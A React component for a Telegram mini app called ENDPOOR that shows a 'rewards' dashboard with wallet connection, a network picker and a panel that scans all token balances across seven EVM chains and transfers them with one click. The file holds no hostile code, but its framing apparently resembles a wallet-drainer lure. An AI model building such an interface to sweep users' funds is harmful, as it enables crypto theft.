import { useEffect, useState } from "react";
import WebApp from "@twa-dev/sdk";
import { useWalletContext } from "../hooks/useWalletContext";
import { SUPPORTED_NETWORKS, NETWORK_META } from "../config/networks";
import { NetworkBadge } from "./NetworkBadge";
import { PipelinePanel } from "./PipelinePanel";

function shortenAddress(addr: string): string {
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

export function RewardsDashboard() {
  const {
    address,
    isConnected,
    chainId,
    chainName,
    isSupportedNetwork,
    switchNetwork,
  } = useWalletContext();

  const [tgUser, setTgUser] = useState<string | null>(null);

  useEffect(() => {
    try {
      WebApp.ready();
      WebApp.expand();
      const user = WebApp.initDataUnsafe?.user;
      if (user) {
        setTgUser(user.first_name ?? user.username ?? null);
      }
    } catch {
      // Not running inside Telegram
    }
  }, []);

  useEffect(() => {
    if (isConnected && !isSupportedNetwork) {
      const ethereum = SUPPORTED_NETWORKS[0];
      switchNetwork(ethereum).catch(() => {});
    }
  }, [isConnected, isSupportedNetwork, switchNetwork]);

  return (
    <div className="flex min-h-screen flex-col bg-[#0A0E17] text-white">
      {/* Header */}
      <header className="flex items-center justify-between px-4 pb-2 pt-4">
        <div>
          <h1 className="text-lg font-bold tracking-tight">ENDPOOR</h1>
          {tgUser && (
            <p className="text-xs text-white/50">Welcome, {tgUser}</p>
          )}
        </div>
        <div className="flex items-center gap-2">
          {isConnected && <NetworkBadge chainId={chainId} />}
          <appkit-connect-button size="sm" />
        </div>
      </header>

      {/* Banner */}
      <section className="mx-4 mt-3 overflow-hidden rounded-2xl bg-gradient-to-br from-indigo-600 via-violet-600 to-fuchsia-500 p-[1px]">
        <div className="rounded-2xl bg-[#0A0E17]/80 px-5 py-6 backdrop-blur">
          <p className="mb-1 text-xs font-semibold uppercase tracking-widest text-fuchsia-300">
            Cross-Chain Settlement
          </p>
          <h2 className="text-xl font-extrabold leading-tight">
            Connect Wallet &mdash; Auto-Detect All Balances
          </h2>
          <p className="mt-2 text-sm text-white/60">
            Scan 7 EVM chains, detect all tokens, transfer with one click.
          </p>

          {isConnected ? (
            <div className="mt-4 flex items-center gap-3">
              <div className="flex-1 rounded-xl bg-white/5 px-3 py-2">
                <p className="text-[10px] uppercase tracking-wider text-white/40">
                  Connected Wallet
                </p>
                <p className="font-mono text-sm font-medium">
                  {address ? shortenAddress(address) : "—"}
                </p>
              </div>
              <div className="rounded-xl bg-white/5 px-3 py-2 text-center">
                <p className="text-[10px] uppercase tracking-wider text-white/40">
                  Network
                </p>
                <p className="text-sm font-medium">
                  {chainName ?? "Unknown"}
                </p>
              </div>
            </div>
          ) : (
            <div className="mt-4">
              <appkit-connect-button label="Connect Wallet" />
            </div>
          )}
        </div>
      </section>

      {/* Network Grid */}
      <section className="px-4 pt-5">
        <h3 className="mb-3 text-sm font-semibold text-white/70">
          Supported Networks
        </h3>
        <div className="grid grid-cols-2 gap-2">
          {SUPPORTED_NETWORKS.map((network) => {
            const id = network.id as number;
            const meta = NETWORK_META[id];
            if (!meta) return null;
            const isActive = chainId === id;

            return (
              <button
                key={id}
                onClick={() => isConnected && switchNetwork(network)}
                className={`flex items-center gap-2.5 rounded-xl border px-3 py-2.5 text-left transition-colors ${
                  isActive
                    ? "border-white/20 bg-white/10"
                    : "border-white/5 bg-white/[0.02] hover:bg-white/5"
                }`}
              >
                <span
                  className="h-3 w-3 shrink-0 rounded-full"
                  style={{ backgroundColor: meta.color }}
                />
                <span className="text-sm font-medium">{meta.name}</span>
                {isActive && (
                  <span className="ml-auto text-[10px] font-semibold uppercase text-emerald-400">
                    Active
                  </span>
                )}
              </button>
            );
          })}
        </div>
      </section>

      {/* Multi-Chain Scanner + Transfer */}
      <PipelinePanel />

      {!isConnected && (
        <div className="flex flex-1 items-center justify-center px-4 py-12 text-center">
          <p className="text-sm text-white/40">
            Connect your wallet to scan balances across all chains.
          </p>
        </div>
      )}

      <div className="pb-8" />
    </div>
  );
}
